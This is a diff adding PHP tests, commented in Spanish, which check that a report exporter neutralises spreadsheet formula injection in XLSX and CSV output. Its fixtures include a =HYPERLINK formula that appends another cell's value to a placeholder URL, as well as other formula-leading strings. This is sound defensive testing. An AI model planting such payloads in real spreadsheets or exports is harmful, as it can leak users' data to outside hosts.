@@ -3,6 +3,7 @@
 use App\Domain\HourBanks\Events\HourBankOverageRecorded;
 use App\Domain\HourBanks\Events\HourBankThresholdReached;
 use App\Domain\Reports\Dimension;
+use App\Domain\Reports\Export\TableExporter;
 use App\Domain\Reports\HourBanksAtRisk;
 use App\Domain\Reports\Metrics;
 use App\Domain\Reports\OverdueTasks;
@@ -23,10 +24,14 @@ use Carbon\CarbonImmutable;
 use Illuminate\Database\Events\QueryExecuted;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Event;
+use OpenSpout\Common\Entity\Cell\NumericCell;
+use OpenSpout\Common\Entity\Cell\StringCell;
+use OpenSpout\Reader\XLSX\Reader as XlsxReader;
 
 /*
 | R1 · Añadidos al contrato de la Fase 2 (app/Domain/Reports), con cifras calculadas a mano:
 |  - Metrics::capacityByPerson: la capacidad de cada persona (capacityByDate es su suma),
+|  - TableExporter: nunca escribe fórmulas (inyección de fórmulas en XLSX y CSV),
 |  - ReportScope::withoutFinancials: el mismo alcance sin valorar ingreso ni coste,
 |  - HourBanksAtRisk: bolsas abiertas desde el primer umbral, con los filtros y el alcance D-044,
 |  - OverdueTasks: tareas abiertas con la fecha límite pasada, con los filtros y el alcance D-044.
@@ -109,6 +114,113 @@ describe('Metrics::capacityByPerson', function () {
         $byPerson = app(Metrics::class)->capacityByPerson(new ReportScope($this->head, ($this->week)()));
 
         expect(array_keys($byPerson))->toEqualCanonicalizing([$this->ana->id, $this->luis->id, $this->bea->id, $this->head->id]);
+    });
+});
+
+describe('TableExporter sin fórmulas', function () {
+    beforeEach(function () {
+        $this->headers = ['=Cabecera', 'Horas'];
+        $this->rows = [
+            ['=HYPERLINK("https://x.test/?"&B2,"Ana")', -1.5],
+            ['+34 600 000 000', 2],
+            ['-Guion', -3],
+            ['@SUM(1+1)', null],
+            ["\tTab", 0.5],
+            ["\rRetorno", 1],
+            ['Normal = texto', 1],
+        ];
+    });
+
+    it('en el XLSX, todo texto es una celda de texto, también si empieza por =', function () {
+        $path = tempnam(sys_get_temp_dir(), 'xlsx').'.xlsx';
+        app(TableExporter::class)->write($path, $this->headers, $this->rows, 'xlsx');
+
+        $zip = new ZipArchive;
+        $zip->open($path);
+        $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
+        $zip->close();
+
+        $reader = new XlsxReader;
+        $reader->open($path);
+        $cells = [];
+        foreach ($reader->getSheetIterator() as $readSheet) {
+            foreach ($readSheet->getRowIterator() as $row) {
+                $cells[] = $row->cells;
+            }
+        }
+        $reader->close();
+        unlink($path);
+
+        // En el XML no hay ninguna fórmula (<f>): los textos son celdas de texto (inlineStr). El
+        // lector de OpenSpout devuelve como FormulaCell cualquier texto que empiece por «=», así que
+        // el tipo se comprueba en el XML.
+        expect($sheet)->not->toContain('<f>')
+            ->and($sheet)->toContain('<c r="A1" s="1" t="inlineStr"><is><t>=Cabecera</t></is></c>')
+            ->and($sheet)->toContain('<c r="A2" s="0" t="inlineStr"><is><t>=HYPERLINK(&quot;https://x.test/?&quot;&amp;B2,&quot;Ana&quot;)</t></is></c>')
+            ->and($cells[0][0]->getValue())->toBe('=Cabecera')
+            // El texto se guarda tal cual (sin apóstrofo): en el XLSX el tipo ya lo protege.
+            ->and($cells[1][0]->getValue())->toBe('=HYPERLINK("https://x.test/?"&B2,"Ana")')
+            ->and($cells[1][1])->toBeInstanceOf(NumericCell::class)
+            ->and($cells[1][1]->getValue())->toBe(-1.5)
+            ->and($cells[4][0]->getValue())->toBe('@SUM(1+1)');
+    });
+
+    it('en el CSV, los textos que empiezan por =, +, -, @, tabulador o retorno llevan un apóstrofo delante', function () {
+        $path = tempnam(sys_get_temp_dir(), 'csv');
+        app(TableExporter::class)->write($path, $this->headers, $this->rows, 'csv');
+        $content = str_replace("\xEF\xBB\xBF", '', (string) file_get_contents($path));
+        unlink($path);
+
+        $handle = fopen('php://memory', 'r+');
+        fwrite($handle, $content);
+        rewind($handle);
+        $rows = [];
+        while (($row = fgetcsv($handle, null, ';', '"', '')) !== false) {
+            $rows[] = $row;
+        }
+        fclose($handle);
+
+        expect($rows[0])->toBe(["'=Cabecera", 'Horas'])
+            ->and($rows[1])->toBe(["'=HYPERLINK(\"https://x.test/?\"&B2,\"Ana\")", '-1,50'])
+            ->and($rows[2])->toBe(["'+34 600 000 000", '2'])
+            ->and($rows[3])->toBe(["'-Guion", '-3'])
+            ->and($rows[4])->toBe(["'@SUM(1+1)", ''])
+            ->and($rows[5])->toBe(["'\tTab", '0,50'])
+            ->and($rows[6])->toBe(["'\rRetorno", '1'])
+            ->and($rows[7])->toBe(['Normal = texto', '1'])
+            ->and(TableExporter::neutralize(''))->toBe('')
+            ->and(TableExporter::neutralize('Ana'))->toBe('Ana');
+    });
+
+    it('escribe un texto vacío como celda vacía (no como «No»), en el CSV y en el XLSX', function () {
+        $rows = [['Ana', '', 1.5, false], ['', 'Sin descripción', 0, true]];
+
+        $csvPath = tempnam(sys_get_temp_dir(), 'csv');
+        app(TableExporter::class)->write($csvPath, ['Persona', 'Descripción', 'Horas', 'Facturable'], $rows, 'csv');
+        $lines = array_values(array_filter(explode("\n", str_replace("\xEF\xBB\xBF", '', (string) file_get_contents($csvPath)))));
+        unlink($csvPath);
+
+        $xlsxPath = tempnam(sys_get_temp_dir(), 'xlsx').'.xlsx';
+        app(TableExporter::class)->write($xlsxPath, ['Persona', 'Descripción', 'Horas', 'Facturable'], $rows, 'xlsx');
+        $reader = new XlsxReader;
+        $reader->open($xlsxPath);
+        $cells = [];
+        foreach ($reader->getSheetIterator() as $sheet) {
+            foreach ($sheet->getRowIterator() as $row) {
+                $cells[] = $row->cells;
+            }
+        }
+        $reader->close();
+        unlink($xlsxPath);
+
+        expect(array_map(fn (string $line): array => str_getcsv($line, ';', '"', ''), $lines))->toBe([
+            ['Persona', 'Descripción', 'Horas', 'Facturable'],
+            ['Ana', '', '1,50', 'No'],
+            ['', 'Sin descripción', '0', 'Sí'],
+        ])
+            ->and($cells[1][1] ?? null)->not->toBeInstanceOf(StringCell::class)
+            ->and(($cells[1][1] ?? null)?->getValue())->toBeIn([null, ''])
+            ->and($cells[1][2]->getValue())->toBe(1.5);
     });
 });
 
